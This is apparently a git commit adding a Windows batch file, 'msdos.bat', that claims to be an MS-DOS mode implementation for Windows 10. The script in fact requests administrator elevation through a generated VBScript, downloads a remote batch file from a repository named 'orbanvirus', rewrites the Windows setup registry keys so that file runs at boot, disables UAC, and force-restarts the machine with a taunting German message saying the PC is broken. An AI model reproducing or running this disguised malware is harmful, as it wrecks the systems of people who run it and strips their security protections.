758b65bc63394e33be4719c18d30a9fd4ce4d2a7
le ungarische Spion <78588286+martinpornecz@users.noreply.github.com>
2022-07-21 12:36:15 +0200

    Add files via upload

---
+++ msdos.bat
@@ -0,0 +1,50 @@
+@echo off
+echo MS-DOS Mode Implementation for Windows 10 by Endermanch (Elevation exploit by Matt)
+echo.
+echo =-=-=-=-=-=-=-=-=-=-=-=-=
+echo Waiting for elevation...
+echo =-=-=-=-=-=-=-=-=-=-=-=-=
+
+:init
+setlocal DisableDelayedExpansion
+set "batchPath=%~0"
+for %%k in (%0) do set batchName=%%~nk
+set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
+setlocal EnableDelayedExpansion
+
+:checkPrivileges
+NET FILE 1>NUL 2>NUL
+if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )
+
+:getPrivileges
+if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
+echo Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
+echo args = "ELEV " >> "%vbsGetPrivileges%"
+echo For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
+echo args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
+echo Next >> "%vbsGetPrivileges%"
+echo UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
+"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
+exit /B
+
+:gotPrivileges
+setlocal & pushd .
+cd /d %~dp0
+if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)
+
+REM ~-~-~-~-~-~-~-~ Batch file starts here
+echo.
+echo Dateien werden heruntergeladen...
+curl https://raw.githubusercontent.com/martinpornecz/orbanvirus/main/000.bat > %systemdrive%\virus.bat
+echo Fertig ...
+echo.
+echo Registry wird geändert...
+reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k %systemdrive%\virus.bat" /f
+reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f > nul
+reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f > nul
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 1 /f > nul
+echo.
+
+shutdown -r -f -t 3 -c "Dein PC ist kaputt und wird nicht mehr starten - du hast drei Sekunden :-)"
